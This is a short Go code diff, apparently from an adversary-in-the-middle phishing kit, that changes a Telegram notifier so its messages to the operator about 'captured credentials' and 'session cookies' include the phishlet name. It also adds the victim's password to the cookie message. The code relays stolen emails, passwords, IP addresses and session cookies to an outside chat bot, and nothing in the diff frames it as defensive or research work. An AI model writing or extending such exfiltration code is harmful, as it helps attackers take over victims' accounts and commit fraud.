@@ -48,6 +48,7 @@ func (t *TelegramNotifier) SendCredentialsNotification(session *database.Session
 	message := fmt.Sprintf(`🔐 Credentials Captured
 
 🆔 Session ID: %d
+🎣 Phishlet: %s
 👤 Email: %s
 🔑 Password: %s
 🌐 Browser: %s
@@ -56,6 +57,7 @@ func (t *TelegramNotifier) SendCredentialsNotification(session *database.Session
 
 ⏳ Waiting for session cookies...`,
 		session.Id,
+		session.Phishlet,
 		session.Username,
 		session.Password,
 		browser,
@@ -67,7 +69,7 @@ func (t *TelegramNotifier) SendCredentialsNotification(session *database.Session
 	return t.sendMessage(botToken, chatID, message)
 }
 
-// SendCookiesNotification sends cookies when they are captured (separate from credentials)
+// SendCookiesNotification sends cookies when they are captured (same format as credentials, with cookie file)
 func (t *TelegramNotifier) SendCookiesNotification(session *database.Session) error {
 	if !t.cfg.IsTelegramEnabled() {
 		return nil
@@ -93,11 +95,13 @@ func (t *TelegramNotifier) SendCookiesNotification(session *database.Session) er
 		cookieCount += len(domainCookies)
 	}
 
-	// Build message
+	// Build message - same format as credentials, with cookies info
 	message := fmt.Sprintf(`🍪 Session Cookies Captured!
 
 🆔 Session ID: %d
+🎣 Phishlet: %s
 👤 Email: %s
+🔑 Password: %s
 🌐 Browser: %s
 📍 IP Address: %s
 🗓 Time: %s
@@ -105,7 +109,9 @@ func (t *TelegramNotifier) SendCookiesNotification(session *database.Session) er
 
 ✅ Full session capture complete!`,
 		session.Id,
+		session.Phishlet,
 		session.Username,
+		session.Password,
 		browser,
 		session.RemoteAddr,
 		timeStr,
